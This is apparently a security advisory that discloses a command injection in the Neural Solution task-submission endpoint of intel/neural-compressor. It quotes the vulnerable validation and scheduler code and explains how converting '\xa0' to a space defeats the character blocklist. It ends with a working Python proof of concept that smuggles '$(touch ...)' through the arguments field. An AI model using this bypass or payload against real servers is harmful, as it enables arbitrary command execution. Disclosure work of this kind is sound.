## Description

`intel / neural-compressor`'s `Neural Solution` -> `@app.post("/task/submit/")` remote endpoint allows user to submit `Task` for `effortlessly submit optimization tasks through the RESTful/gRPC APIs`. The endpoint is protected by `neural_solution/frontend/utility.py` -> `is_valid_task` for examining `arguments` that are going to be parsed as arguments in `neural_solution/backend/scheduler.py` -> `_parse_cmd` -> `task_cmd.append(self.sanitize_arguments(task.arguments))`. However, the parsed-in `task.arguments`'s sanitization `sanitize_arguments` replaces space encoding `\xa0` directly with `" "` hardcoded, allowing attackers to exploit command injections in source `task.arguments` to sink `task_cmd.append(self.sanitize_arguments(task.arguments))`

## Source-To-Sink

Similar to the IFS bypass, `neural-compressor/neural_solution/frontend/fastapi/main_server.py` -> `@app.post("/task/submit/")` defined the remote endpoint for `Neural Solution` Task Management, within this endpoint, user can specify their model and param for optimization in `Neural Solution`.

```python
@app.post("/task/submit/")
async def submit_task(task: Task):
    """Submit task.

    Args:
        task (Task): _description_
        Fields:
            task_id: The task id
            arguments: The task command
            workers: The requested resource unit number
            status: The status of the task: pending/running/done
            result: The result of the task, which is only value-assigned when the task is done

    Returns:
        json: status , id of task and messages.
    """
    if not is_valid_task(task.dict()):
        raise HTTPException(status_code=422, detail="Invalid task")

    msg = "Task submitted successfully"
    status = "successfully"
    # search the current
    db_path = get_db_path(config.workspace)

    if os.path.isfile(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        task_id = str(uuid.uuid4()).replace("-", "")
        sql = (
            r"insert into task(id, script_url, optimized, arguments, approach, requirements, workers, status)"
            + r" values ('{}', '{}', {}, '{}', '{}', '{}', {}, 'pending')".format(
                task_id,
                task.script_url,
                task.optimized,
                list_to_string(task.arguments),
                task.approach,
                list_to_string(task.requirements),
                task.workers,
            )
        )
        cursor.execute(sql)
        conn.commit()

```

Nevertheless, the `param` must undergo sanitizations at `neural_solution/frontend/utility.py` -> `def is_valid_task(task: dict)`. This patch (sanitization) method mostly focused on forbidding possible `Command Injection`, `SQL Injection attacks` by first examining parsed-in parameter types. This patch is implemented in `Fix Neural Solution SQL/CMD injection` ([intel#1627](https://github.com/intel/neural-compressor/pull/1627)) on `Feb 27` by `Kaihui-intel`.

```python
def is_valid_task(task: dict) -> bool:
    """Verify whether the task is valid.

    Args:
        task (dict): task request

    Returns:
        bool: valid or invalid
    """
    required_fields = ["script_url", "optimized", "arguments", "approach", "requirements", "workers"]

    for field in required_fields:
        if field not in task:
            return False

    if not isinstance(task["script_url"], str) or is_invalid_str(task["script_url"]):
        return False

    if (isinstance(task["optimized"], str) and task["optimized"] not in ["True", "False"]) or (
        not isinstance(task["optimized"], str) and not isinstance(task["optimized"], bool)
    ):
        return False

    if not isinstance(task["arguments"], list):
        return False
    else:
        for argument in task["arguments"]:
            if is_invalid_str(argument):
                return False

    if not isinstance(task["approach"], str) or task["approach"] not in ["static", "static_ipex", "dynamic", "auto"]:
        return False

    if not isinstance(task["requirements"], list):
        return False
    else:
        for requirement in task["requirements"]:
            if is_invalid_str(requirement):
                return False

    if not isinstance(task["workers"], int) or task["workers"] < 1:
        return False

    return True
```

After sanitizing the `types` of parsed in `task structure`, all string objects are required to go through ``neural_solution/frontend/utility.py` -> `is_valid_str`` for furthermore examination on the legalism of contain characters. Character such as `|`, `'`,`;` is forbidden due to possible vectors on `sql injections`, `command injections`.

```python
def is_invalid_str(to_test_str: str):
    """Verify whether the to_test_str is valid.

    Args:
        to_test_str (str): string to be tested.

    Returns:
        bool: valid or invalid
    """
    return any(char in to_test_str for char in [" ", '"', "'", "&", "|", ";", "`", ">"])
```

the reason why the `arguments` variable is being strictly examinate is because this variable is parsed directly in to `neural_solution/backend/scheduler.py` -> `_parse_cmd` as a explicit components of the executed `task_cmd` of the optimization `mpirun`, which will be included in the `bash_script` during `mpirun` execution as `full_cmd = """cd {}\n{} bash {}""".format(self.task_path, mpi_cmd, bash_script_name)`

```python
    def _parse_cmd(self, task: Task, resource):
        # mpirun -np 3 -mca btl_tcp_if_include 192.168.20.0/24 -x OMP_NUM_THREADS=80
        # --host mlt-skx091,mlt-skx050,mlt-skx053 bash run_distributed_tuning.sh
        self.prepare_task(task)
        conda_env = self.prepare_env(task)
        host_str = ",".join([item.split(" ")[1] for item in resource])
        logger.info(f"[TaskScheduler] host resource: {host_str}")

        # Activate environment
        conda_bash_cmd = f"source {CONDA_SOURCE_PATH}"
        conda_env_cmd = f"conda activate {conda_env}"
        mpi_cmd = [
            "mpirun",
            "-np",
            "{}".format(task.workers),
            "-host",
            "{}".format(host_str),
            "-map-by",
            "socket:pe={}".format(self.num_threads_per_process),
            "-mca",
            "btl_tcp_if_include",
            "192.168.20.0/24",  # TODO replace it according to the node
            "-x",
            "OMP_NUM_THREADS={}".format(self.num_threads_per_process),
            "--report-bindings",
        ]
        mpi_cmd = " ".join(mpi_cmd)

        # Initial Task command
        task_cmd = ["python"]
        task_cmd.append(self.script_name)
        task_cmd.append(self.sanitize_arguments(task.arguments))
        task_cmd = " ".join(task_cmd)

        # use optimized code by Neural Coder
        if not task.optimized:
            task_cmd = task_cmd.replace(".py", "_optimized.py")

        # build a bash script to run task.
        bash_script_name = "distributed_run.sh" if task.workers > 1 else "run.sh"
        bash_script = """{}\n{}\ncd {}\n{}""".format(conda_bash_cmd, conda_env_cmd, self.task_path, task_cmd)
        bash_script_path = os.path.join(self.task_path, bash_script_name)
        with open(bash_script_path, "w", encoding="utf-8") as f:
            f.write(bash_script)
        full_cmd = """cd {}\n{} bash {}""".format(self.task_path, mpi_cmd, bash_script_name)

        return full_cmd
```

Since we knew that our `Task.aguements` being parsed at `neural-compressor/neural_solution/frontend/fastapi/main_server.py` -> `@app.post("/task/submit/")` goes to `_parse_cmd` 's `bash_script` executed during the `mpirun` execution, it will be possible for us to construct an Command Injection Payload. In our case, we are limited on the characters we can apply on `neural_solution/frontend/utility.py` -> `is_valid_str` with space and [Backtick](https://en.wikipedia.org/wiki/Backtick) banned.

Nevertheless, taking a closer look at `neural_solution/backend/scheduler.py` -> `sanitize_arguments(self, arguments: str):` which is used to sanitize the argument parsed at `task_cmd.append(self.sanitize_arguments(task.arguments))`, we can find a interesting discovery:

```python
    def sanitize_arguments(self, arguments: str):
        """Replace space encoding with space."""
        return arguments.replace("\xa0", " ")
```

Here `sanitize_arguments` directly replaces the space encoding `\xa0` with character `" "` (space), we can assume this is a mitigation against command injection vectors in `task.arguments`. Nevertheless, this also provided us with a new vector to construct the forbidden `" "` (space) in specified in `is_invalid_str()`, allowing us to execute arbitrary commands building the `task.arguments`:

## `PoC.py`

```python
import requests
import json

def exploit(
    url = "http://localhost:8000"
):
    session = requests.Session()
    session.trust_env = False

    malicious_task = {
        "script_url": "https://example.com/",
        "optimized": "False",
        "arguments": [
            "$(touch\xa0/tmp/retr0injection)"
        ],
        "approach": 'static', 
        "requirements": [""],
        "workers": 1,
    }
    
    print(f"[*] Host = {url}\n")

    print("[!] Request: /task/submit/")
    response = session.post(url+'/task/submit/', data=json.dumps(malicious_task), headers={"Content-Type": "application/json"})
    print(response.content)
    
exploit()
```

the `/tmp/retr0injection` will be created a few seconds after the request.

# Impact

Bypass of existing mitigation of Task.argument